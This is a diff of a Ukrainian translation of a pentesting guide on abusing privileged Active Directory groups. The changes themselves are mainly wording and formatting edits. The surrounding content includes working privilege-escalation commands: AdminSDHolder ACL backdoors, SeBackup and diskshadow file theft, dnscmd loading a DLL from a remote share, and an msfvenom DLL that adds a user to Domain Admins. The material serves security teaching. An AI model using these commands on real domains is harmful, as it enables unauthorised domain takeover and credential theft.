@@ -4,16 +4,16 @@
 
 ## Відомі групи з адміністративними привілеями
 
-- **Адміністратори**
-- **Адміністратори домену**
-- **Адміністратори підприємства**
+- **Administrators**
+- **Domain Admins**
+- **Enterprise Admins**
 
 ## Оператори облікових записів
 
 Ця група має право створювати облікові записи та групи, які не є адміністраторами домену. Крім того, вона дозволяє локальний вхід до Контролера домену (DC).
 
-Щоб ідентифікувати членів цієї групи, виконується наступна команда:
-```powershell
+Щоб визначити членів цієї групи, виконується наступна команда:
+```bash
 Get-NetGroupMember -Identity "Account Operators" -Recurse
 ```
 Додавання нових користувачів дозволено, а також локальний вхід до DC01.
@@ -22,10 +22,10 @@ Get-NetGroupMember -Identity "Account Operators" -Recurse
 
 Список контролю доступу (ACL) групи **AdminSDHolder** є критично важливим, оскільки він встановлює дозволи для всіх "захищених груп" в Active Directory, включаючи групи з високими привілеями. Цей механізм забезпечує безпеку цих груп, запобігаючи несанкціонованим змінам.
 
-Зловмисник може скористатися цим, змінивши ACL групи **AdminSDHolder**, надаючи повні дозволи стандартному користувачу. Це фактично надасть цьому користувачу повний контроль над усіма захищеними групами. Якщо дозволи цього користувача будуть змінені або видалені, вони автоматично відновляться протягом години через дизайн системи.
+Зловмисник може скористатися цим, змінивши ACL групи **AdminSDHolder**, надаючи повні дозволи стандартному користувачу. Це фактично надасть цьому користувачу повний контроль над усіма захищеними групами. Якщо дозволи цього користувача будуть змінені або видалені, вони будуть автоматично відновлені протягом години через дизайн системи.
 
 Команди для перегляду учасників і зміни дозволів включають:
-```powershell
+```bash
 Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
 Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
 Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
@@ -50,14 +50,14 @@ Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
 ```cmd
 C:\> .\PsService.exe security AppReadiness
 ```
-Ця команда показує, що `Server Operators` мають повний доступ, що дозволяє маніпулювати службами для підвищених привілеїв.
+Ця команда показує, що `Server Operators` мають повний доступ, що дозволяє маніпулювати службами для підвищення привілеїв.
 
 ## Backup Operators
 
-Членство в групі `Backup Operators` надає доступ до файлової системи `DC01` завдяки привілеям `SeBackup` та `SeRestore`. Ці привілеї дозволяють обходити папки, перераховувати та копіювати файли, навіть без явних дозволів, використовуючи прапорець `FILE_FLAG_BACKUP_SEMANTICS`. Для цього процесу необхідно використовувати специфічні скрипти.
+Членство в групі `Backup Operators` надає доступ до файлової системи `DC01` завдяки привілеям `SeBackup` та `SeRestore`. Ці привілеї дозволяють проходження через папки, їх перелік та копіювання файлів, навіть без явних дозволів, використовуючи прапорець `FILE_FLAG_BACKUP_SEMANTICS`. Для цього процесу необхідно використовувати специфічні скрипти.
 
 Щоб перерахувати членів групи, виконайте:
-```powershell
+```bash
 Get-NetGroupMember -Identity "Backup Operators" -Recurse
 ```
 ### Локальна атака
@@ -85,7 +85,7 @@ Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Over
 
 #### Using diskshadow.exe
 
-1. Створіть тіньову копію диска `C`:
+1. Create a shadow copy of the `C` drive:
 ```cmd
 diskshadow.exe
 set verbose on
@@ -133,13 +133,13 @@ echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\
 Члени групи **DnsAdmins** можуть використовувати свої привілеї для завантаження довільного DLL з привілеями SYSTEM на DNS-сервері, який часто розміщується на контролерах домену. Ця можливість дозволяє значний потенціал для експлуатації.
 
 Щоб перерахувати членів групи DnsAdmins, використовуйте:
-```powershell
+```bash
 Get-NetGroupMember -Identity "DnsAdmins" -Recurse
 ```
 ### Виконати довільний DLL
 
 Члени можуть змусити DNS-сервер завантажити довільний DLL (як локально, так і з віддаленого ресурсу) за допомогою команд, таких як:
-```powershell
+```bash
 dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
 dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
 An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:
@@ -158,7 +158,7 @@ system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /doma
 // Generate DLL with msfvenom
 msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
 ```
-Перезапуск служби DNS (який може вимагати додаткових дозволів) необхідний для завантаження DLL:
+Перезапуск служби DNS (який може вимагати додаткових дозволів) є необхідним для завантаження DLL:
 ```csharp
 sc.exe \\dc01 stop dns
 sc.exe \\dc01 start dns
@@ -167,15 +167,15 @@ sc.exe \\dc01 start dns
 
 #### Mimilib.dll
 
-Також можливо використовувати mimilib.dll для виконання команд, модифікуючи його для виконання конкретних команд або реверсних шелів. [Перевірте цей пост](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) для отримання додаткової інформації.
+Також можливо використовувати mimilib.dll для виконання команд, модифікувавши його для виконання конкретних команд або реверсних шелів. [Перегляньте цей пост](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) для отримання додаткової інформації.
 
-### WPAD запис для MitM
+### Запис WPAD для MitM
 
-DnsAdmins можуть маніпулювати DNS записами для виконання атак Man-in-the-Middle (MitM), створюючи WPAD запис після вимкнення глобального списку блокування запитів. Інструменти, такі як Responder або Inveigh, можуть бути використані для спуфінгу та захоплення мережевого трафіку.
+DnsAdmins можуть маніпулювати DNS-записами для виконання атак Man-in-the-Middle (MitM), створюючи запис WPAD після вимкнення глобального списку блокування запитів. Інструменти, такі як Responder або Inveigh, можуть бути використані для спуфінгу та захоплення мережевого трафіку.
 
 ### Читачі журналів подій
 Члени можуть отримувати доступ до журналів подій, потенційно знаходячи чутливу інформацію, таку як паролі в чистому вигляді або деталі виконання команд:
-```powershell
+```bash
 # Get members and search logs for sensitive information
 Get-NetGroupMember -Identity "Event Log Readers" -Recurse
 Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
@@ -183,7 +183,7 @@ Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Va
 ## Exchange Windows Permissions
 
 Ця група може змінювати DACL на об'єкті домену, потенційно надаючи привілеї DCSync. Техніки ескалації привілеїв, що використовують цю групу, детально описані в репозиторії Exchange-AD-Privesc на GitHub.
-```powershell
+```bash
 # List members
 Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
 ```
@@ -203,33 +203,33 @@ sc.exe start MozillaMaintenance
 
 ## Управління організацією
 
-У середовищах, де розгорнуто **Microsoft Exchange**, спеціальна група, відома як **Управління організацією**, має значні можливості. Ця група має привілей **доступу до поштових скриньок усіх користувачів домену** та підтримує **повний контроль над Організаційною одиницею 'Microsoft Exchange Security Groups'**. Цей контроль включає групу **`Exchange Windows Permissions`**, яка може бути використана для ескалації привілеїв.
+В середовищах, де розгорнуто **Microsoft Exchange**, спеціальна група, відома як **Управління організацією**, має значні можливості. Ця група має привілей **доступу до поштових скриньок усіх користувачів домену** та підтримує **повний контроль над Організаційною одиницею 'Microsoft Exchange Security Groups'**. Цей контроль включає групу **`Exchange Windows Permissions`**, яка може бути використана для ескалації привілеїв.
 
 ### Експлуатація привілеїв та команди
 
 #### Оператори друку
 
-Члени групи **Оператори друку** наділені кількома привілеями, включаючи **`SeLoadDriverPrivilege`**, що дозволяє їм **локально входити в систему на Контролері домену**, вимикати його та керувати принтерами. Щоб експлуатувати ці привілеї, особливо якщо **`SeLoadDriverPrivilege`** не видно в умовах без підвищення привілеїв, необхідно обійти Контроль облікових записів користувачів (UAC).
+Члени групи **Оператори друку** наділені кількома привілеями, включаючи **`SeLoadDriverPrivilege`**, що дозволяє їм **локально входити на Контролер домену**, вимикати його та керувати принтерами. Щоб експлуатувати ці привілеї, особливо якщо **`SeLoadDriverPrivilege`** не видно в умовах без підвищення привілеїв, необхідно обійти Контроль облікових записів користувачів (UAC).
 
 Щоб перерахувати членів цієї групи, використовується наступна команда PowerShell:
-```powershell
+```bash
 Get-NetGroupMember -Identity "Print Operators" -Recurse
 ```
-Для більш детальних технік експлуатації, пов'язаних з **`SeLoadDriverPrivilege`**, слід звернутися до конкретних ресурсів безпеки.
+Для більш детальних технік експлуатації, пов'язаних з **`SeLoadDriverPrivilege`**, слід звернутися до специфічних ресурсів безпеки.
 
 #### Користувачі віддаленого робочого столу
 
 Членам цієї групи надається доступ до ПК через протокол віддаленого робочого столу (RDP). Для перерахунку цих членів доступні команди PowerShell:
-```powershell
+```bash
 Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
 Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
 ```
-Додаткову інформацію про експлуатацію RDP можна знайти в спеціалізованих ресурсах з пентестингу.
+Додаткову інформацію про експлуатацію RDP можна знайти в спеціалізованих ресурсах для пентестингу.
 
 #### Користувачі віддаленого керування
 
-Члени можуть отримувати доступ до ПК через **Windows Remote Management (WinRM)**. Перерахування цих членів досягається через:
-```powershell
+Члени можуть отримувати доступ до ПК через **Windows Remote Management (WinRM)**. Перерахування цих членів досягається за допомогою:
+```bash
 Get-NetGroupMember -Identity "Remote Management Users" -Recurse
 Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
 ```
@@ -238,10 +238,10 @@ Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Us
 #### Оператори серверів
 
 Ця група має дозволи на виконання різних налаштувань на контролерах домену, включаючи привілеї резервного копіювання та відновлення, зміну системного часу та вимкнення системи. Щоб перерахувати учасників, використовується наступна команда:
-```powershell
+```bash
 Get-NetGroupMember -Identity "Server Operators" -Recurse
 ```
-## Посилання <a href="#references" id="references"></a>
+## References <a href="#references" id="references"></a>
 
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
 - [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
